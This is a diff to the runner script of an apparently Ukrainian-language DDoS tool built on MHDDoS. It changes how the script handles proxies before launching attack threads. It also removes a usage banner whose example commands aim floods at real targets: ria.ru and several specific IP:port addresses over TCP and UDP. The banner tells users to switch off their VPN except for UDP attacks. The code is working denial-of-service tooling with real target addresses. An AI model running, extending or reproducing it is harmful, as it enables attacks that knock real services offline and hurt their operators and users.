@@ -144,26 +144,25 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, debug):
 
 
 def start(total_threads, period, targets, rpc, http_methods, debug):
+    skip_proxies = True
+
     os.chdir('MHDDoS')
+
+    if skip_proxies:
+        os.makedirs('files/proxies/', exist_ok=True)
+        with open('files/proxies/proxies.txt', 'w'): pass
+
     while True:
         resolved = list(targets)
+
         if not resolved:
             logger.error('Must provide either targets or a valid config file')
             exit()
 
-        if rpc < LOW_RPC:
-            logger.warning(
-                f'RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
-                f'через збільшення кількості перемикань кожного потоку між проксі.'
-            )
+        no_proxies = skip_proxies or all(target.lower().startswith('udp://') for target in resolved)
 
-#         no_proxies = all(target.lower().startswith('udp://') for target in resolved)
-#         if not no_proxies:
-#             update_proxies(period, resolved)
-
-        os.makedirs('files/proxies/', exist_ok=True)
-        with open('files/proxies/proxies.txt', 'w') as wr:
-            logger.info('No proxies are being used!')
+        if not no_proxies:
+            update_proxies(period, resolved)
 
         run_ddos(resolved, total_threads, period, rpc, http_methods, debug)
 
@@ -216,33 +215,8 @@ def init_argparse() -> argparse.ArgumentParser:
     return parser
 
 
-def print_banner():
-    print('''\
-                            !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
-
-# Конфігурація. Усі параметри можна комбінувати, можна вказувати і до і після переліку цілей.
-Для Docker замініть `python3 runner.py` на `docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest`
-
-- Навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
-    python3 runner.py -t 3000 https://ria.ru tcp://194.54.14.131:22
-- Інформація про хід атаки - прапорець `--debug`
-    python3 runner.py --debug https://ria.ru tcp://194.54.14.131:22
-- Частота оновлення проксі (за замовчуванням - кожні 15 хвилин) - `-p SECONDS`
-    python3 runner.py -p 1200 https://ria.ru tcp://194.54.14.131:22
-- Повна документація - `python3 runner.py --help` 
-# Варіанти цілей (перші три можна змішувати в одній команді)
-- URL         https://ria.ru
-- IP + PORT   5.188.56.124:3606
-- TCP         tcp://194.54.14.131:22
-- UDP         udp://217.175.155.100:53 - !!!ТІЛЬКИ ДЛЯ ЦЬОГО ПОТРІБЕН VPN!!!
-
-                          !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
-    ''')
-
-
 if __name__ == '__main__':
     args = init_argparse().parse_args()
-    # print_banner()
     start(
         args.threads,
         args.period,
